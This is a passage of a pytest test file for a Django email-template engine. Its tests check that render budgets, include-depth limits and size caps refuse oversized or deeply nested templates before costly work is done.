    with _within(1.0):
        admitted = (("{{" * 30 + "x" * 999)[:999] + "\n") * 50
        assert any("opens no template code" in message for message in _refusals(_unsaved(source=admitted)))


def test_budget_sticky_through_if(plain: Any, kit: Any) -> None:
    """p10, q9: once spent, every charge raises, even where an if operator swallowed the first; per thread and task."""

    del plain, kit
    engine = MessageTemplateEngine(autoescape=True)
    swallowing = engine.from_string('{% if x|upper == "A" %}T{% else %}F{% endif %}' * 2 + "tail")
    budget = RenderBudget(filter_input=150)
    with pytest.raises(RenderBudgetExceeded), budget.spend():
        swallowing.render(engine.context({"x": "a"}))
    assert budget.exceeded and RENDER_BUDGET.get(None) is None
    with pytest.raises(LookupError, match="RenderBudget.spend"):
        engine.from_string("{{ x|upper }}").render(engine.context({"x": "a"}))
    looping = engine.from_string("{% for i in items %}{{ i|upper }}{% endfor %}")
    results: dict[int, Any] = {}

    def worker(index: int, size: int) -> None:
        try:
            with RenderBudget().spend():
                results[index] = len(looping.render(engine.context({"items": ["a"] * size})))
        except RenderBudgetExceeded:
            results[index] = "exceeded"

    threads = [threading.Thread(target=worker, args=(index, 400 if index % 2 else 600)) for index in range(6)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert results == {index: 400 if index % 2 else "exceeded" for index in range(6)}

    async def concurrently() -> list[Any]:
        def render(size: int) -> int:
            with RenderBudget().spend():
                return len(looping.render(engine.context({"items": ["a"] * size})))

        return list(await asyncio.gather(*(sync_to_async(render)(400) for _ in range(3))))

    assert asyncio.run(concurrently()) == [400, 400, 400]
    assert RENDER_BUDGET.get(None) is None


def test_include_renders_charge_the_budget(plain: Any, kit: Any) -> None:
    """p14: each include render charges an iteration, so includes in a loop stop at the pass's 500."""

    del plain
    _row("part", "empty", source="")
    looping = _mail("{% for i in items %}\n\n" + '{% include "parts/empty" only %}\n\n' * 2 + "{% endfor %}",
                    {"items.*": "x"})
    with _within(1.0):
        with pytest.raises(RenderBudgetExceeded):
            _render(looping, {"items": [0] * 300}, kit)
    assert _render(looping, {"items": [0] * 166}, kit).plain_text.strip() == ""


def test_walk_stops_expanding_at_its_node_bound(plain: Any) -> None:
    """Nodes count once per include site; past 1,000 the walk stops, so nested includes cannot multiply its work."""

    del plain
    fan = "\n".join([('{% include "blocks/next" only %}') * 30] * 10)
    _row("block", "last", source="<b>x</b>", text_source="x")
    _row("block", "next", source=fan.replace("blocks/next", "blocks/last"), text_source="x")
    _row("block", "fan", source=fan, text_source="x")
    template = _unsaved(source=fan.replace("blocks/next", "blocks/fan"), format="html", text_source="x")
    with _within(1.0):
        assert any("over 1000 nodes" in message for message in _refusals(template))


def _text_read(monkeypatch: pytest.MonkeyPatch) -> list[tuple[int, int]]:
    """Record what each ``with_text`` call reads: the characters of a level's text, and of its ``variables``."""

    read: list[tuple[int, int]] = []
    with_text = MessageTemplateQuerySet.with_text

    def recorded(rows: Any, named: Any) -> Any:
        found = with_text(rows, named)
        read.append((sum(len(row.source) + len(row.text_source) for row in found.values()),
                     sum(len(json.dumps(row.variables, ensure_ascii=False)) for row in found.values())))
        return found

    monkeypatch.setattr(MessageTemplateQuerySet, "with_text", recorded)
    return read


def test_a_level_is_counted_before_its_text_is_read(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """A row including 600 parts of 48,999 characters made one query load 602 rows, 29.4 million characters, before
    the source cap was tested: a level's rows now come with their text_length alone, and a level past
    WALK_SOURCE_LIMIT is refused before any of its text is read, on the render-side judge. The console insert's walk
    of such a level is the console module's."""

    del plain
    read = _text_read(monkeypatch)
    for index in range(600):
        _row("part", f"wide{index}", source="\n".join(["a" * 999] * 49))
    wide = "\n".join("".join(f'{{% include "parts/wide{index}" only %}}' for index in range(line, line + 25))
                     for line in range(0, 600, 25))
    template = _unsaved(format="html", source=wide, text_source="x", key="tests.wide")
    counts: dict[str, int] = {}
    with system_context(reason="tests.messaging_templates.render.wide"), CaptureQueriesContext(connection) as q:
        walk = TemplateWalker().judge(template, MessageTemplate.objects)
    assert walk.refusals == ["tests.wide: the rows it reaches hold over 150000 characters of source"], walk.refusals
    assert list(walk.rows) == ["tests.wide"] and read == [], read
    counts["judge"] = len(q)
    assert counts == WIDE_QUERIES, counts


WIDE_QUERIES = {"judge": 1}
"""The queries of the wide level's walks: as many as before, which loaded every row's text in the first."""


def _filled(characters: int) -> str:
    """Text of exactly ``characters`` characters, in lines of 999 ending in an accented and an astral character."""

    lines, rest = divmod(characters, 1_000)
    return ("x" * 997 + "\u00e9\U0001f600\n") * lines + "x" * rest


def test_a_walk_at_the_source_cap_renders_and_one_character_more_is_refused_unread(
    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The cap counts characters as len() does, astral ones included, on PostgreSQL and SQLite alike: a tree holding
    exactly WALK_SOURCE_LIMIT renders, its level read whole, and one character more is refused before it is read."""

    read = _text_read(monkeypatch)
    template = _mail("\n\n".join(f'{{% include "parts/full{index}" only %}}' for index in range(3)), key="tests.full")
    held = len(template.source) + len(template.text_source) + len(plain.source) + len(plain.text_source)
    rows = [_row("part", f"full{index}", source=_filled(49_999)) for index in range(2)]
    rows.append(_row("part", "full2", source=_filled(150_000 - held - 2 * 49_999)))
    with system_context(reason="tests.messaging_templates.render.full"):
        sized: Any = MessageTemplate.objects.named_rows(["parts/full2"], language="en")["parts/full2"]
        assert sized.text_length == len(rows[2].source) and "\U0001f600" in rows[2].source
        assert TemplateWalker().judge(template, MessageTemplate.objects).refusals == []
    assert [text for text, _ in read] == [150_000 - len(template.source) - len(template.text_source)], read
    assert "\U0001f600" in _render(template, {}, kit).plain_text
    read.clear()
    with system_context(reason="tests.messaging_templates.render.full"):
        rows[2].source += "x"
        rows[2].save()
        refusals = TemplateWalker().judge(template, MessageTemplate.objects).refusals
    assert refusals == ["tests.full: the rows it reaches hold over 150000 characters of source"], refusals
    assert read == [], read


def _declaring(characters: int, letter: str = "d") -> dict[str, str]:
    """Fifty paths described in ``letter`` whose JSON holds exactly ``characters`` characters, within an author's
    limits."""

    described = characters - 2 - 50 * 9 - 49 * 2  # braces, '"v00": ""' a path, ', ' between them
    share, rest = divmod(described, 50)
    return {f"v{index:02}": letter * (share + (index < rest)) for index in range(50)}


def test_a_level_s_variables_are_counted_before_they_are_read(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """400 parts each declaring one 40,000-character description, or one 40,000-character path, were admitted, and
    every walk of a template including them loaded 16 million characters of variables: an author's row can no longer
    declare either, and a level whose stored variables would carry the walk past WALK_VARIABLES_LIMIT is refused
    before they are read, on the render-side judge. The console insert's walk of such a level is the console
    module's."""

    del plain
    read = _text_read(monkeypatch)
    shapes = {"described": {"a": "d" * 40_000}, "named": {"a" * 40_000: "x"}}
    codes = {"described": "variable_description_too_long", "named": "variable_path_too_long"}
    counts: dict[str, int] = {}
    for shape, variables in shapes.items():
        with pytest.raises(ValidationError) as refused, system_context(reason="tests.messaging_templates.render"):
            _unsaved("part", "alone", variables=variables).full_clean()
        assert [error.code for error in refused.value.error_dict["variables"]] == [codes[shape]]
        for index in range(400):
            _row("part", f"{shape}{index}", source="x", variables=variables)  # stored past clean, as before
        source = "\n".join("".join(f'{{% include "parts/{shape}{index}" only %}}' for index in range(line, line + 25))
                           for line in range(0, 400, 25))
        template = _unsaved(format="html", source=source, text_source="x", key=f"tests.{shape}")
        with system_context(reason="tests.messaging_templates.render.declared"), CaptureQueriesContext(connection) as q:
            walk = TemplateWalker().judge(template, MessageTemplate.objects)
        assert walk.refusals == [f"tests.{shape}: the rows it reaches declare over 100000 characters of variables"]
        assert list(walk.rows) == [f"tests.{shape}"] and read == [], read
        counts[f"{shape} judge"] = len(q)
    assert counts == DECLARED_QUERIES, counts


DECLARED_QUERIES = {"described judge": 1, "named judge": 1}
"""The queries of those walks: the level's query, which no longer reads its rows' variables, and nothing after it."""


def test_a_walk_at_the_variables_cap_renders_and_one_character_more_is_refused_unread(
    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The walk counts a declaration in characters: a tree declaring exactly WALK_VARIABLES_LIMIT renders, its level
    read whole, and one character more is refused before the level is read. On PostgreSQL the jsonb text is as long as
    json.dumps writes it unescaped, so the descriptions are Cyrillic there; SQLite holds Django's escapes, so they are
    ASCII there, and a Cyrillic one counts six a character (the SQLite line of WALK_VARIABLES_LIMIT)."""

    del plain
    letter = "\u0436" if connection.vendor == "postgresql" else "d"
    read = _text_read(monkeypatch)
    template = _mail("\n\n".join(f'{{% include "parts/declared{index}" only %}}' for index in range(2)),
                     key="tests.declared")
    held = len(json.dumps(template.variables)) + len(json.dumps({}))  # the template and its layout
    rows = [_row("part", "declared0", source="x", variables=_declaring(50_000, letter)),
            _row("part", "declared1", source="x", variables=_declaring(100_000 - held - 50_000, letter))]
    assert max(len(path) for row in rows for path in row.variables) <= 200
    assert max(len(text) for row in rows for text in row.variables.values()) < 1_000
    with system_context(reason="tests.messaging_templates.render.declared"):
        for row in rows:
            row.full_clean()
        sized: Any = MessageTemplate.objects.named_rows(["parts/declared1"], language="en")["parts/declared1"]
        assert sized.variables_length == len(json.dumps(rows[1].variables, ensure_ascii=False)), sized.variables_length
        assert TemplateWalker().judge(template, MessageTemplate.objects).refusals == []
    assert [declared for _, declared in read] == [100_000 - len(json.dumps(template.variables))], read
    assert _render(template, {}, kit).plain_text
    read.clear()
    with system_context(reason="tests.messaging_templates.render.declared"):
        rows[1].variables["v00"] += letter
        rows[1].save()
        refusals = TemplateWalker().judge(template, MessageTemplate.objects).refusals
    assert refusals == ["tests.declared: the rows it reaches declare over 100000 characters of variables"], refusals
    assert read == [], read
    if connection.vendor == "sqlite":
        escaped = _row("part", "escaped", source="x", variables={"a": "\u0436" * 10})
        with system_context(reason="tests.messaging_templates.render.declared"):
            stored: Any = MessageTemplate.objects.named_rows(["parts/escaped"], language="en")["parts/escaped"]
        # Ten escapes of six characters, and '{"a": ""}'.
        assert stored.variables_length == len(json.dumps(escaped.variables)) == 69


@pytest.mark.parametrize("letter", ["\u0436", "\u4e2d", "\U00020000"], ids=["cyrillic", "cjk", "astral"])
def test_a_declaration_in_any_script_is_counted_in_characters(plain: Any, kit: Any, letter: str) -> None:
    """A part declaring 20 paths, each described in 1,000 Cyrillic, CJK or astral characters (20,220 characters, within
    an author's limits), was counted in JSON escapes, six a character or twelve, so its own full_clean() refused it and
    it could not be previewed: a row's walk now counts characters. Included by a template, it renders on PostgreSQL,
    whose jsonb text counts characters too; on SQLite the level's count reads Django's escaped text, 120,220 or
    240,220, and refuses it, the documented SQLite limit."""

    del plain
    part = _unsaved("part", "script", source="Said.", variables={f"v{index:02}": letter * 1_000 for index in range(20)})
    assert len(json.dumps(part.variables, ensure_ascii=False)) == 20_220
    with system_context(reason="tests.messaging_templates.render.script"):
        part.full_clean()
        part.save()
        assert part.preview(kit=kit).rendered is not None
    template = _mail('{% include "parts/script" only %}', key="tests.script")
    with system_context(reason="tests.messaging_templates.render.script"):
        refusals = TemplateWalker().judge(template, MessageTemplate.objects).refusals
    if connection.vendor == "postgresql":
        assert refusals == [], refusals
        assert "Said." in _render(template, {}, kit).plain_text
    else:
        assert refusals == ["tests.script: the rows it reaches declare over 100000 characters of variables"], refusals
        assert len(json.dumps(part.variables)) in (120_220, 240_220)


def test_an_author_s_paths_and_descriptions_are_held_to_their_lengths_and_a_stored_row_still_renders(
    plain: Any, kit: Any,
) -> None:
    """A root is loaded by its caller, uncounted by any level read, so clean() holds an author's row to paths of 200
    characters and descriptions of 1,000; a row stored longer before the rule renders until it is next edited, its
    declaration counted by the walk's cap, and its next full_clean() refuses it."""

    del plain
    for variables, code in (({"a" * 201: "x"}, "variable_path_too_long"),
                            ({"a": "d" * 1_001}, "variable_description_too_long")):
        with pytest.raises(ValidationError) as refused, system_context(reason="tests.messaging_templates.render"):
            _unsaved(variables=variables).full_clean()
        assert [error.code for error in refused.value.error_dict["variables"]] == [code], refused.value
    with system_context(reason="tests.messaging_templates.render"):
        _unsaved(variables={"a" * 200: "d" * 1_000}).full_clean()
    stored = _mail("Hello.", {"a" * 300: "d" * 5_000}, key="tests.stored")
    assert _render(stored, {}, kit).plain_text.strip() == "Hello."
    with system_context(reason="tests.messaging_templates.render"):
        assert stored.preview(kit=kit).rendered is not None
        stored.name = "Renamed"
        with pytest.raises(ValidationError) as refused:
            stored.full_clean()
    assert [error.code for error in refused.value.error_dict["variables"]] == ["variable_path_too_long"]


def test_walk_character_cap(plain: Any) -> None:
    """q4: the rows one walk reaches hold at most 150,000 characters, each counted before it is parsed."""

    del plain
    big = "\n".join(["x" * 999] * 50)
    for index in range(4):
        _row("part", f"big{index}", source=big)
    template = _unsaved(source="\n\n".join(f'{{% include "parts/big{index}" only %}}' for index in range(4)))
    with _within(2.0):
        refusals = _refusals(template)
        assert any("over 150000 characters" in message for message in refusals), refusals


# ---------- the costliest work the caps admit: what it does, and its CPU on request ----------

TIMED = pytest.mark.skipif(
    not TIMED_RUN, reason="CPU-time bounds depend on the machine and its load; ANGEE_TIMED_TESTS=1 runs them",
)
"""The CPU bounds of the costliest passes and previews, run on request in the lane and at integration; the
default suite pins the work the same cases do instead."""

DEEP = "a." + ".".join(["b"] * 7)
"""The longest path a row declares: eight segments."""

R20 = "'" + "r" * 20 + "'"
"""The costliest date format a row may write: twenty characters, each a full RFC 5322 date."""


def _loop(lines: list[str], sequence: str = "items") -> str:
    return "{% for i in " + sequence + " %}\n" + "\n".join(lines) + "\n{% endfor %}"


def _deep_ifs(count: int) -> list[str]:
    return [("{% if " + DEEP + " %}{% endif %}") * 15] * count


DATED = [("{% with x=d|date:" + R20 + " %}{% endwith %}") * 10]
CHAINS = ["{% if " + " or ".join(["x == y"] * 5) + " %}{% endif %}"] * 30
"""Comparisons of two 10,000-character values that differ in their last character (an earlier review's case), as many
as the node cap admits now that each operator is a node: five to a condition, the most ten operators hold."""
LINE = "{% for i in few %}{% with " + " ".join(f"v{index}=d|date:{R20}" for index in range(6)) + \
    " %}{% endwith %}{% endfor %}"
"""The costliest subject a 255-character column holds: six such dates an item, as many items as its pass allows."""
TIMED_VALUES = {"items": [0] * 500, "a": {}, "d": "2026-11-24T15:30:00+00:00"}


def _dated(first: int, count: int) -> str:
    """A loop printing each item's date in ``count`` distinct 20-character formats, none of them reached."""

    lines = [f"{{{{ i.when|date:'rrrrrrrrrrrrrrrrr{index:03d}' }}}}" for index in range(first, first + count)]
    return "{% for i in items %}{% if forloop.counter > 600 %}\n" + "\n".join(lines) + "\n{% endif %}{% endfor %}"


DATED_VALUES = {"items": [{"when": "2026-11-24T15:30:00+00:00"}] * 500}
"""500 items whose date the dated row prints in 560 formats: once a format in prepare(), never once a value."""
TIMED_VARIABLES = {"items.*": "x", DEEP: "x", "d": "x"}

PASS_CASES: dict[str, tuple[dict[str, Any], dict[str, Any]]] = {
    "q1-deep-operands": ({"source": _loop(_deep_ifs(31))}, TIMED_VALUES),
    "q11b-combined": ({"source": _loop(DATED + _deep_ifs(31))}, TIMED_VALUES),
    "p11-outputs-outside-loops": ({"source": "\n".join(["{{ q }}" * 29] * 10), "variables": {"q": "x"}},
                                  {"q": '"' * 10_000}),
}


def _pass_case(name: str) -> tuple[TemplateWalk, dict[str, Any]]:
    rows, values = PASS_CASES[name]
    template = _mail(rows["source"], rows.get("variables", TIMED_VARIABLES), format="html", text_source="x")
    return _walk(template), values


ADMITTED_PREVIEWS = ("admitted", "review", "dated", "onebracket")


def _preview_cases() -> dict[str, Any]:
    """The costliest previews, admitted and refused.

    ``admitted``: a q11b loop in both forms beside Markdown rows of ``*_`` (the costliest row pattern) inside
    ``{% comment %}`` (a full row check for one node, q4). ``review``: the Django review's case, ``==`` chains on
    10,000-character values and a third hidden row up to the walk's 150,000 characters, with the costliest
    subject its pass admits (50 items of six dates; the 500 list items are shared). ``review-subject``: the same
    with the review's subject over every item, which the subject's budget stops. ``refused``: a walk reaching
    150,000 characters of ``*_`` rows whose HTML forms pass the text cap only when the walk is over. ``headings``
    and ``rules``: :data:`MULTIPLIED` rows, a template and two parts saved past their check.
    """

    star_lines = [("*_" * 499)[:999]] * 49
    commented = "{% comment %}\n\n" + "\n".join(star_lines) + "\n\n{% endcomment %}"
    for index in range(3):
        # Just under a third of the walk's 150,000 characters each, so all three are checked, then refused.
        _row("part", f"star{index}", source="\n".join([line[:996] for line in [*star_lines, star_lines[0]]]))
    for index in range(2):
        _row("part", f"hidden{index}", source=commented)
        for name, multiplied in MULTIPLIED.items():
            _row("part", f"{name}{index}", source=multiplied)
    for name, (part, count) in WALKED_PARTS.items():
        for index in range(count):
            _row("part", f"{name}{index}", source=part)
    for index in range(45):
        _row("part", f"commented{index}", source=COMMENTED_QUOTES)
    combined = _loop(DATED + _deep_ifs(6) + CHAINS)
    hidden = '\n{% include "parts/hidden0" only %}{% include "parts/hidden1" only %}'
    loop = _loop(DATED + _deep_ifs(30))
    heavy = _loop(DATED + _deep_ifs(10) + CHAINS)
    used = len(heavy + hidden) + len(heavy) + 2 * len(commented)
    _row("part", "hidden2", source="{% comment %}\n\n" + "\n".join(star_lines)[: 150_000 - used - 300]
         + "\n\n{% endcomment %}")
    review = {**TIMED_VALUES, "x": "a" * 9_999 + "b", "y": "a" * 9_999 + "c"}
    return {
        "admitted": _mail(
            loop + hidden, TIMED_VARIABLES, format="html", text_source=loop, key="tests.admitted",
            # The two includes charge two of the pass's 500 iterations.
            sample={**TIMED_VALUES, "items": [0] * 498},
        ),
        "review": _mail(
            heavy + hidden + '{% include "parts/hidden2" only %}',
            {**TIMED_VARIABLES, "x": "x", "y": "x", "few.*": "x"},
            format="html", text_source=heavy, key="tests.review", subject=LINE,
            sample={**review, "items": [0] * 450, "few": [0] * 50},
        ),
        "review-subject": _mail(
            heavy + hidden + '{% include "parts/hidden2" only %}', {**TIMED_VARIABLES, "x": "x", "y": "x"},
            format="html", text_source=heavy, key="tests.review_subject", subject=LINE.replace(" few ", " items "),
            sample={**review, "items": [0] * 497},
        ),
        "refused": _mail("\n\n".join(f'{{% include "parts/star{index}" only %}}' for index in range(3)),
                         key="tests.refused"),
        "dated": _mail(_dated(0, 280), {"items.*.when": "x"}, format="html", text_source=_dated(300, 280),
                       key="tests.dated", sample=DATED_VALUES),
        **{name: _mail(source + "".join(f'\n\n{{% include "parts/{name}{index}" only %}}' for index in range(2)),
                       key=f"tests.{name}")
           for name, source in MULTIPLIED.items()},
        **{name: _mail("\n".join(f'{{% include "parts/{name}{index}" only %}}' for index in range(count)),
                       format="html", text_source="x", key=f"tests.{name}")
           for name, (_, count) in WALKED_PARTS.items()},
        "onebracket": _bracketed("onebracket", "![" + STARS[:997]),
        "images": _bracketed("images", IMAGES),
        "combined": _mail(
            combined + "\n" + "\n".join(f'{{% include "parts/commented{index}" only %}}' for index in range(45)),
            {**TIMED_VARIABLES, "x": "x", "y": "x", "few.*": "x"}, format="html", text_source=combined,
            key="tests.combined", subject=LINE, sample={**review, "items": [0] * 450, "few": [0] * 50},
        ),
    }


STARS = ("*_" * 499)[:999]
IMAGES = "".join(("![" if index % 33 == 0 else "") + "*_" for index in range(485))[:999]
"""A line of emphasis delimiters, and one with thirty image openers among them: an author's costliest Markdown."""


def _bracketed(prefix: str, first: str) -> Any:
    """The review loop beside three commented parts of star lines, each opening on ``first``: the same caps."""

    lines = "\n".join([first] + [STARS] * 48)
    heavy = _loop(DATED + _deep_ifs(10) + CHAINS)
    hidden = f'\n{{% include "parts/{prefix}0" only %}}{{% include "parts/{prefix}1" only %}}'
    commented = "{% comment %}\n\n" + lines + "\n\n{% endcomment %}"
    for index in range(2):
        _row("part", f"{prefix}{index}", source=commented)
    room = 150_000 - len(heavy + hidden) - len(heavy) - 2 * len(commented) - 300
    _row("part", f"{prefix}2", source="{% comment %}\n\n" + lines[:room] + "\n\n{% endcomment %}")
    return _mail(heavy + hidden + f'{{% include "parts/{prefix}2" only %}}',
                 {**TIMED_VARIABLES, "x": "x", "y": "x", "few.*": "x"}, format="html", text_source=heavy,
                 key=f"tests.{prefix}", subject=LINE,
                 sample={**TIMED_VALUES, "x": "a" * 9_999 + "b", "y": "a" * 9_999 + "c", "items": [0] * 450,
                         "few": [0] * 50})


def test_a_markdown_row_s_label_scans_are_capped(plain: Any) -> None:
    """Each [ makes the Markdown pass scan the rest of its paragraph, list item or heading: a row whose scans would
    cover over 50,000 characters is refused before the pass runs; one [ before a whole paragraph, and a list of fifty
    links, are admitted."""

    del plain
    paragraph = "\n".join(["![" + STARS[:997]] + [STARS] * 48)
    assert _refusals(_unsaved("part", "one", source="{% comment %}\n\n" + paragraph + "\n\n{% endcomment %}")) == []
    links = "\n".join(f"- [Link {index}](https://example.test/{index})" for index in range(50))
    assert _refusals(_unsaved("part", "list", source=links)) == []
    for source in ("![![" + paragraph[4:], "\n".join([IMAGES] * 49)):
        refusals = _refusals(_unsaved("part", "many", source=source))
        assert len(refusals) == 1 and "would scan across" in refusals[0] and "over 50000" in refusals[0], refusals


def test_an_opener_that_opens_no_template_code_is_refused_before_the_markdown_pass(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An unclosed {{ inside a comment renders nothing, but the Markdown pass scanned each to the end of its line:
    refused before it runs, comments included; template code holding {{ as text stays."""

    del plain
    passes: list[Any] = []
    _recording(monkeypatch, MarkdownFormatHandler, "forms", lambda handler, row: passes.append(row))
    refusals = _refusals(_unsaved("part", "open", source="{% comment %}{{ x{% endcomment %}"))
    assert refusals == ["parts/open: source holds {{, {% or {# that opens no template code: write "
                        "{% templatetag openvariable %} and its kin for a literal one"], refusals
    assert passes == []
    assert _refusals(_unsaved("part", "noted", source="Hi {# a {{ b #}")) == []


COMMENTED_QUOTES = "{% comment %}\n\n" + "\n\n".join(["> > > a"] * 333) + "\n\n{% endcomment %}"
"""A part admitted alone that renders nothing, whose comment the Markdown pass and the HTML checks read in full: 333
three-deep quotes, each quote an element carrying two brand outputs."""


def test_a_walk_stops_at_what_its_checks_read(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """The heavy review loop beside 45 commented parts was admitted and read 8.6 million form characters; the walk
    now stops once the forms its checks have read pass the walk's read caps, comments included."""

    del plain
    with system_context(reason="tests.messaging_templates.render.walk"):
        _unsaved("part", "alone", source=COMMENTED_QUOTES).full_clean()
    template = _preview_cases()["combined"]
    checked: list[str] = []
    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
    assert _refusals(template) == [
        "tests.combined: the forms of the rows it reaches hold over 600000 characters or 4000 template spans for its "
        "checks to read, comments included"]
    assert len(checked) == CHECKED_FOR_THE_READ_CAP, checked


CHECKED_FOR_THE_READ_CAP = 4
"""The template, its layout and two commented parts, whose forms pass the walk's span read cap."""


WALKED_PARTS = {
    "quotes": ("\n\n".join(["> > > a"] * 50), 309),
    "single": ("\n\n".join(["> a"] * 150), 190),
    "fivedeep": ("\n\n".join(["> > > > > a"] * 200), 56),
    "thousand": ("\n\n".join(["> a"] * 1_000), 29),
}
"""Templates including many Markdown parts of quotes, each quote an element carrying two brand outputs: 309 parts of
three-deep quotes and 190 of single ones, each admitted alone; 56 of five-deep quotes and 29 of a thousand, written
past their check. A walk over them cost 2.4 to 3.9 s of CPU before the tree's caps refused it; it now stops as soon as
the rows it has checked pass one. Each is the most whose level fits WALK_SOURCE_LIMIT, since a level past it is refused
before any of its rows is checked, so these hold the tree's caps to the walk."""


def test_a_walk_over_parts_each_admitted_alone_stops_at_the_trees_caps(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A part of 50 three-deep quotes passes clean() alone; a template including 309 of them is refused after the
    template, its layout and one part are checked, at the tree's caps, never after all 309."""

    del plain
    source, count = WALKED_PARTS["quotes"]
    with system_context(reason="tests.messaging_templates.render.walk"):
        _unsaved("part", "alone", source=source).full_clean()
    for index in range(count):
        _row("part", f"walked{index}", source=source)
    template = _mail("\n".join(f'{{% include "parts/walked{index}" only %}}' for index in range(count)),
                     format="html", text_source="x", key="tests.walked")
    checked: list[str] = []
    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
    assert _refusals(template) == [
        "tests.walked: its html reaches over 1000 nodes", "tests.walked: its html reaches over 300 outputs"]
    assert checked == CHECKED_BEFORE_THE_CAPS, checked


CHECKED_BEFORE_THE_CAPS = ["tests.walked", "layouts/plain", "parts/walked0"]
"""The template, its layout and one part: the part's 300 outputs and the layout's pass the tree's caps."""


def test_a_saving_walk_resolves_a_level_in_one_query(plain: Any) -> None:
    """A part including 10 hubs of 49 parts each asked, on the saving walk, whether each of 490 targets resolves, one
    query a target; it asks once a level."""

    del plain
    for hub in range(10):
        for index in range(49):
            _row("part", f"leaf{hub}x{index}", source="x")
        _row("part", f"hub{hub}", source="\n\n".join(
            f'{{% include "parts/leaf{hub}x{index}" only %}}' for index in range(49)))
    fan = _unsaved("part", "fan", source="\n\n".join(f'{{% include "parts/hub{hub}" only %}}' for hub in range(10)))
    with system_context(reason="tests.messaging_templates.render.save"), CaptureQueriesContext(connection) as queries:
        with pytest.raises(ValidationError, match="reaches over 1000 nodes"):
            fan.full_clean()
    assert len(queries) == SAVING_WALK_QUERIES, len(queries)


SAVING_WALK_QUERIES = 24
"""The queries of that saving walk: 520 before a level resolved in one query, and 22 before a level's text was read
after its sizes, one query a level more."""


def test_a_chain_past_the_include_depth_is_refused_before_the_gather_reads_it(plain: Any, kit: Any) -> None:
    """A chain of 900 includes cost a query or more a level: the gather now stops at the depth a tree reaches, in the
    tree's own words, so the saving walk and the render-side judge each make queries bounded by INCLUDE_DEPTH_LIMIT,
    whatever the chain's length. The console insert's walk of a chain is the console module's."""

    del plain
    for index in range(900):
        source = "x" if index == 899 else f'{{% include "parts/chain{index + 1}" only %}}'
        _row("part", f"chain{index}", source=source)
    counts: dict[str, int] = {}
    for length in (5, 900):
        head = _unsaved("part", f"head{length}", source=f'{{% include "parts/chain{900 - length}" only %}}')
        with system_context(reason="tests.messaging_templates.render.chain"), CaptureQueriesContext(connection) as q:
            with pytest.raises(ValidationError) as raised:
                head.full_clean()
        assert raised.value.messages == [f"parts/chain{902 - length}: includes nest over 3 deep"], raised.value
        counts[f"saving {length}"] = len(q)
    template = _mail('{% include "parts/chain0" only %}', key="tests.chained")
    with system_context(reason="tests.messaging_templates.render.chain"), CaptureQueriesContext(connection) as q:
        refusals = TemplateWalker().judge(template, MessageTemplate.objects).refusals
    assert refusals == ["parts/chain2: includes nest over 3 deep"]
    counts["judge"] = len(q)
    assert counts == CHAIN_QUERIES, counts


CHAIN_QUERIES = {"saving 5": 27, "saving 900": 27, "judge": 6}
"""The queries each walk of a chain makes; before the gather stopped at the tree's depth, a 900 chain cost 1,018 as
system work and 499 on the render-side judge. Reading a level's text after its sizes adds one query to each of the
three levels a walk reads (24, 24 and 3 before)."""


def test_an_include_inside_a_condition_keeps_the_condition(plain: Any, kit: Any) -> None:
    """An include inside {% if link %} read link through a fresh frame without the caller's guard, so link became
    required: the included row now keeps the guards on the values it is passed, as the same content inline does, and a
    value it reads unguarded is still required."""

    del plain
    _row("part", "linked", format="html", source='<a href="{{ link|url }}">Open</a>', text_source="{{ link|url }}",
         variables={"link": "x"})
    _row("part", "both", format="html", source="{{ link|url }} {{ other }}", text_source="{{ other }}",
         variables={"link": "x", "other": "x"})
    inline = _mail('{% if link %}<a href="{{ link|url }}">Open</a>{% endif %}', {"link": "x"}, format="html",
                   text_source="{% if link %}{{ link|url }}{% endif %}", key="tests.inline")
    included = _mail('{% if link %}{% include "parts/linked" with link=link only %}{% endif %}', {"link": "x"},
                     format="html", text_source="x", key="tests.included", sample={})
    for template in (inline, included):
        assert _walk(template).required == set(), template.key
        for values in ({"link": "https://example.test/"}, {"link": None}, {}):
            _render(template, values, kit)
    with system_context(reason="tests.messaging_templates.render.guard"):
        assert included.preview(kit=kit).rendered is not None
    leaking = _mail('{% if link %}{% include "parts/both" with link=link other=other only %}{% endif %}',
                    {"link": "x", "other": "x"}, format="html", text_source="x", key="tests.leaking")
    assert _walk(leaking).required == {("other",)}


def test_a_chain_at_the_include_depth_renders(plain: Any, kit: Any) -> None:
    """A template including a chain exactly INCLUDE_DEPTH_LIMIT deep is admitted and renders every link."""

    del plain
    for index in range(3):
        source = "Last." if index == 2 else f'Link {index}.\n\n{{% include "parts/link{index + 1}" only %}}'
        _row("part", f"link{index}", source=source)
    template = _mail('{% include "parts/link0" only %}', key="tests.linked")
    assert _refusals(template) == []
    assert "Last." in _render(template, {}, kit).plain_text


def test_a_walk_compiles_each_span_once(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """The HTML checks compile an output span the first time a walk meets its text, never again in that walk."""

    del plain
    for index in range(3):
        _row("part", f"once{index}", source="\n\n".join(["> a"] * 5))
    template = _mail("\n".join(f'{{% include "parts/once{index}" only %}}' for index in range(3)), format="html",
                     text_source="x", key="tests.once")
    compiled: list[str] = []
    _recording(monkeypatch, MessageTemplateEngine, "from_string", lambda engine, text: compiled.append(text))
    assert _refusals(template) == []
    assert compiled.count("{{ brand.light.border }}") == 1 and compiled.count("{{ brand.light.muted }}") == 1


MULTIPLIED = {
    "headings": "\n".join(["# a"] * 12_400)[:49_000],
    "rules": "\n\n".join(["---"] * 9_800)[:49_000],
}
"""Markdown the pass multiplies: each heading or rule gains a styled tag, so a walk reaching three such rows of
49,000 characters cost over two seconds before any cap applied. Each form is now refused at its own spans' cap."""


def test_a_form_over_its_caps_is_refused_before_the_html_checks_read_it(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The span and text caps meet a form straight after the Markdown pass: the HTML checks never read it."""

    del plain
    read: list[str] = []
    _recording(monkeypatch, walker_module, "check_html", lambda form, *args, **kwargs: read.append(form))
